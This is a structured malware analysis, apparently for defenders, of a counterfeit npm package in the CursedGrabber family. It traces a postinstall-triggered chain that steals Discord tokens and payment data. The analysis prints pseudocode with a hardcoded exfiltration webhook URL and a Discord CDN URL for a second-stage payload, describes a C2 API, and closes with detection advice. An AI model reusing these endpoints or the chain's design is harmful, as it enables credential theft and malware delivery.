package_info.why_malicious: The package is a counterfeit npm component that, upon installation, executes bundled Windows executables designed to steal Discord tokens, browser data, and payment information, and to establish a backdoor for remote control. It is part of the CursedGrabber malware family, specifically targeting Windows users for credential and data theft, and further malware delivery. The package abuses npm's postinstall script to trigger malicious payloads, exfiltrates sensitive data via Discord webhooks, downloads additional malware from Discord CDN, and sets up a local REST API for attacker command-and-control.

malicious_snippets.code_behavior: At postinstall, the package.json script executes the main JavaScript file (lib.js) using Node.js, initiating the execution of bundled malicious Windows executables, resulting in the start of the malware infection chain.

malice_analysis.why_suspicious: The use of a postinstall script to execute arbitrary code is a common technique for malware to gain initial execution without user interaction.
malice_analysis.violated_expectations: Legitimate npm packages rarely require postinstall scripts that execute binaries unrelated to package setup or functionality.
malice_analysis.similar_legitimate_use: Some legitimate packages use postinstall for setup tasks or compilation, but not for launching unrelated or opaque executables.
key_indicators: postinstall script with ambiguous or opaque purpose
triggers execution of local or bundled binaries during installation
initiates malware chain at install-time

malicious_snippets.code_behavior: At postinstall, the code in lib.js uses Node.js child_process to execute two bundled Windows executables (lib.exe and lib2.exe), transferring control to native malware components for further malicious actions.

malice_analysis.why_suspicious: Executing bundled Windows binaries from a JavaScript file during installation is a classic malware technique to bypass user scrutiny and security controls.
malice_analysis.violated_expectations: Node.js packages should not execute unknown or opaque Windows binaries as part of their installation process.
malice_analysis.similar_legitimate_use: Developer tools may invoke platform-specific binaries, but only for transparent, documented purposes and not for unrelated executables.
key_indicators: Execution of bundled EXE files via child_process
No legitimate reason for Windows binary execution in a cross-platform package
Opaque handoff from JavaScript to native code

malicious_snippets.code_snippet:
// C# pseudocode
Read Discord leveldb files and browser profiles
Extract Discord tokens and payment info
Send data to https://discordapp.com/api/webhooks/769943162193707098/jacVRUcz9zBrsstbdIzhzGoRCvfbz3J9BOk8bV5UA_DpUKMtEW3KULQA2q2mBMqjmmsh
malicious_snippets.code_behavior: At runtime, lib.exe reads Discord and browser profile data, extracts Discord tokens and payment information, and exfiltrates the stolen data to a hardcoded Discord webhook endpoint, resulting in credential and financial data theft.

malice_analysis.why_suspicious: Accessing and exfiltrating sensitive user data such as tokens and payment information is a hallmark of credential-stealing malware.
malice_analysis.violated_expectations: Legitimate software should not access or transmit user credentials or payment data without explicit user consent and clear documentation.
malice_analysis.similar_legitimate_use: Security tools may scan for tokens locally for user notification, but never exfiltrate them to remote servers or webhooks.
key_indicators: Access to Discord and browser data files
Exfiltration of sensitive data to hardcoded Discord webhook
Collection of payment information from user profiles

malicious_snippets.code_snippet:
// C# pseudocode
Download ZIP from https://cdn.discordapp.com/attachments/761673865285337119/776740716524601374/bundle-5.0.5.zip
Unzip to temp directory
Execute osloader.exe and winresume.exe
malicious_snippets.code_behavior: At runtime, lib2.exe downloads a ZIP archive from Discord CDN, extracts its contents to a temporary directory, and executes additional malicious binaries (osloader.exe and winresume.exe), enabling further stages of the attack.

malice_analysis.why_suspicious: Downloading and executing further payloads from a remote source is a common dropper technique to extend malware capabilities and evade static detection.
malice_analysis.violated_expectations: Legitimate software should not download and execute arbitrary binaries from remote sources, especially from non-standard locations like Discord CDN.
malice_analysis.similar_legitimate_use: Auto-updaters may download signed updates from official servers, but not from Discord CDN or without user consent.
key_indicators: Download of executable payloads from Discord CDN
Extraction and execution of additional EXE files
Dropper behavior for multi-stage malware

malicious_snippets.code_behavior: At runtime, osloader.exe launches winresume.exe and performs advanced malicious actions including privilege escalation, keylogging, screenshot capture, webcam access, and installation of a persistent backdoor, resulting in full system compromise.

malice_analysis.why_suspicious: Combining multiple advanced attack techniques such as privilege escalation, keylogging, and backdoor installation in a single binary is characteristic of sophisticated malware.
malice_analysis.violated_expectations: Legitimate binaries do not perform privilege escalation, keylogging, screenshot capture, webcam access, or install backdoors without user knowledge and consent.
malice_analysis.similar_legitimate_use: Security or remote support tools may request some of these permissions, but only with explicit user approval and transparency.
key_indicators: Privilege escalation attempts
Keylogging and screenshot capture functionality
Webcam access routines
Backdoor installation and persistence mechanisms

malicious_snippets.code_behavior: At runtime, winresume.exe throws a fake InvalidOperationException with the message 'Windows NT is not supported' and displays this error to the user, misleading the user and attempting to evade detection by security tools.

malice_analysis.why_suspicious: Fake error messages are used to deceive users and security analysts, allowing malware to operate undetected and avoid further scrutiny.
malice_analysis.violated_expectations: Legitimate software does not intentionally mislead users about compatibility or operational status.
malice_analysis.similar_legitimate_use: Some software may display genuine compatibility errors, but not fabricated ones designed to mask malicious activity.
key_indicators: Fake error message about OS compatibility
Anti-analysis and anti-forensics technique to mislead users

malicious_snippets.code_snippet:
private static readonly string APIHost = "http://localhost:20202/api/";
// REST API for C2
malicious_snippets.code_behavior: At runtime, BackdoorApi.dll exposes a REST API on port 20202, enabling remote command-and-control access to the infected machine by the attacker, facilitating ongoing system control and data exfiltration.

malice_analysis.why_suspicious: Exposing a local REST API for command-and-control is a stealthy method for attackers to control compromised systems and issue commands remotely.
malice_analysis.violated_expectations: Legitimate software does not open undocumented local APIs for remote control or C2 purposes.
malice_analysis.similar_legitimate_use: Some developer tools may expose local APIs for legitimate automation, but not for hidden or undocumented remote control.
key_indicators: Local REST API exposed on high-numbered port (20202)
C2 functionality embedded in DLL
Undocumented API endpoints for attacker use

attack_chain.action: User installs the xpc.js npm package, triggering the postinstall script.
lib.js executes bundled Windows binaries lib.exe and lib2.exe.
lib.exe steals Discord tokens, browser data, and payment information, exfiltrating them via Discord webhook.
lib2.exe downloads a malicious ZIP archive from Discord CDN, extracts it, and executes osloader.exe and winresume.exe.
osloader.exe performs privilege escalation, keylogging, screenshot capture, webcam access, and installs a backdoor.
winresume.exe displays a fake error message to mislead users and evade detection.
BackdoorApi.dll exposes a REST API on port 20202 for attacker C2 access.
attack_chain.leads_to: Attacker can remotely control the infected system

behavioral_signatures: npm package with postinstall script executing local or bundled EXE files
Node.js child_process execution of Windows binaries during installation
Bundled or downloaded EXE files accessing Discord/browser data and exfiltrating via Discord webhooks
Download and execution of additional payloads from Discord CDN
Creation of local REST API on high-numbered ports (e.g., 20202) for C2
Display of fake error messages about OS compatibility to mislead users
file_indicators: Bundled binaries: lib.exe, lib2.exe, osloader.exe, winresume.exe
detection_knowledge.how_to_detect: Monitor npm package installations for postinstall scripts that execute binaries, especially on Windows systems. Flag packages containing or executing EXE files during installation. Detect network connections to Discord webhooks and Discord CDN for non-standard payload downloads. Watch for processes opening local REST APIs on uncommon ports (e.g., 20202). Alert on binaries that access Discord/browser data or display fake error messages about OS compatibility. Correlate these behaviors to identify multi-stage malware delivery and C2 activity.
